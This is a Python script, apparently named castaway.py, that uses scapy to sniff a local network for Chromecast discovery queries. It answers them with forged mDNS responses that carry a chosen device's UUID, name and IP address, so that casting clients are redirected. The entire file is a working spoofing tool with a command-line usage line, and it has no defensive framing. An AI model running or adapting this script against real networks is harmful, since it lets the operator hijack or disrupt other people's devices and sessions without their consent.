#!/usr/bin/env python
# -*- coding: utf-8 -*-
#python 2.7
from scapy.all import *
from struct import pack
from time import sleep
import requests
import xml.etree.ElementTree as ET
import binascii
import sys

## Create a Packet Count var
packetCount = 0
redirect_to = '127.0.0.1'

def get_info(ip):
    url = 'http://' + ip + ':8008/ssdp/device-desc.xml'
    r = requests.get(url)
    root = ET.fromstring(r.text)
    uuid = root[2][4].text
    fn = root[2][1].text
    fn = binascii.hexlify(fn)
    uuid = uuid.split(':')[1]
    return [uuid, fn]


def spoof_response(pkt):
    conf.L3socket=L3RawSocket

    # prepping needed unformation from the ip provided by the user
    # get friendly name and uuid from the xml and makes the ip into hex for the query
    uuid_fn = get_info(redirect_to)
    uuid = uuid_fn[0]
    fn = uuid_fn[1]
    fn_len = len(fn)/2
    a = redirect_to.split('.')
    hex_ip = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
    uuid_nodash = ''.join(uuid.split('-'))

    # mdns response top with the chromecast name in there (Chromecast-<uid no dashes>._googlecast._tcp.local
    # may need to dynamically set the length but I am assuming all uuids are the same length
    # TODO test put uid in dynamically
    ans = '00 00 84 00 00 00 00 01 00 00 00 03 0b 5f 67 6f 6f 67 6c 65 63 61 73 74 04 5f 74 63 70'
    dot_local_loc = 'c' + hex(len(''.join(ans.split()))/2)[2:].zfill(3)
    ans += '05 6c 6f 63 61 6c 00 00 0c 00 01 00 00 00 78 00 2e'
    ans += '2b 43 68 72 6f 6d 65 63 61 73 74 2d'                            # Chromecast- prepend
    ans += binascii.hexlify(uuid_nodash)                                   # uuid
    ans += 'c0 0c'                                                          # offset to .local

    data_length = 6 + 3 + len(uuid_nodash) + 3  + fn_len + 3 + 5 + 13 + 18  # num of lengths + weird field len + lengths + ve field len + len chromecast + len icon + 2 threes for xx=

    #TXT record
    ansextratxt =  'c0 2e 00 10 80 01 00 00'                                # intro to text record
    ansextratxt += '11 94'                                                  # Time to Live for dns caching
    ansextratxt += hex(data_length)[2:].zfill(4)                            # data length
    ansextratxt += '23'                                                     # length of next txt section (ID)
    ansextratxt += '69 64 3d'                                               # ASCII id= as hex
    ansextratxt += binascii.hexlify(uuid_nodash)                            # the id
    ansextratxt += '03'                                                     # 3 len of this weird field rs=
    ansextratxt += '72 73 3d'                                               # weird field rs=
    ansextratxt += hex(fn_len + 3)[2:].zfill(2)                             # length of the next txt section (FN)
    ansextratxt += '66 6e 3d'                                               # ASCII fn= as hex
    ansextratxt += fn                                                       # friendly name as hex
    ansextratxt += '05'                                                     # 5 length for ve
    ansextratxt += '76 65 3d 30 35'                                         # ve=05 (seems old one was 02) I think API Version
    ansextratxt += '0d'                                                     # 13 length of md=Chromecast
    ansextratxt += '6d 64 3d 43 68 72 6f 6d 65 63 61 73 74'                 # md=Chromecast
    ansextratxt += '12'                                                     # 18 length of icon
    ansextratxt += '69 63 3d 2f 73 65 74 75 70 2f 69 63 6f 6e 2e 70 6e 67'  # ic=/setup/icon.png

    # part of a real response that I have no idea what they are
    #ansextratxt += '13' # 19 len of rm
    #ansextratxt += '72 6d 3d 43 45 32 33 46 44 38 39 44 36 41 38 41 37 31 33' # rm=CE23FD89D6A8A713
    #ansextratxt += '07' # 7 len of ca
    #ansextratxt += '63 61 3d 34 31 30 31' # ca=4101
    #ansextratxt += '04' # 5 len of st
    #ansextratxt += '73 74 3d 30' # st=0
    #ansextratxt += '0f' # 15 len of bs
    #ansextratxt += '62 73 3d 46 41 38 46 43 41 38 30 42 30 36 39' # bs=FA8FCA80B069

    # SRV record - points to the port that serves the CAST
    ansextrasrv =  'c0 2e 00 21 80 01 00 00 00 78 00 2d 00 00 00 00 1f 49'  # srv record stuff
    dom_loc = 'c' + hex((len(''.join(ans.split())) + len(''.join(ansextratxt.split())) + len(''.join(ansextrasrv.split())))/2)[2:].zfill(3)
    ansextrasrv += '24'                                                     # $ to be the start
    ansextrasrv += binascii.hexlify(uuid)                                   # uid with dashes
    ansextrasrv += dot_local_loc                                            # <uuid with dashes><.local location> --- the last domain

    # A record - points to the ip address of the Chromecast
    ansextraa   =  dom_loc                                                  # offset of the last domain (<uid with dashes>.local)
    ansextraa   += '00 01 80 01 00 00 00 78 00 04 ' + hex_ip                # show th ip

    ansextra = ansextratxt + ansextrasrv + ansextraa                        # build the additional records
    ans += ansextra                                                         # build the answer query adding additionals to the answer

    # turn mDNS answer into hex for the Raw portion of the payload
    data_list = ans.split()
    data_hex = ''.join(data_list).decode('hex')

    #spoofed_pkt = IP(src='192.168.1.104', dst='224.0.0.251')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
    spoofed_pkt = IP(src=redirect_to, dst=pkt[IP].dst)/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
    send(spoofed_pkt)
    print 'Sent spoofed response:', spoofed_pkt.summary()


## Define our Custom Action function
def customAction(packet):
    global packetCount
    packetCount += 1
    #print packet.show()
    if DNSQR in packet:
        if packet[DNSQR].qname == '_googlecast._tcp.local.':
            if packet[IP].dst != redirect_to:
                print 'chromecast is being looked for'
                spoof_response(packet)
                return "Packet #%s: %s ==> %s" % (packetCount, packet[0][1].src, packet[0][1].dst)

## Setup sniff, filtering for IP traffic
if len(sys.argv) < 2:
    print("castaway.py <ip address of chromecast> <interface (Optional default all)>")
    exit(0)
redirect_to = sys.argv[1]
interface = None
if len(sys.argv) >= 3:
    interface = sys.argv[2]
if interface:
    sniff(filter="ip", prn=customAction, iface=interface)
else:
    sniff(filter="ip", prn=customAction)
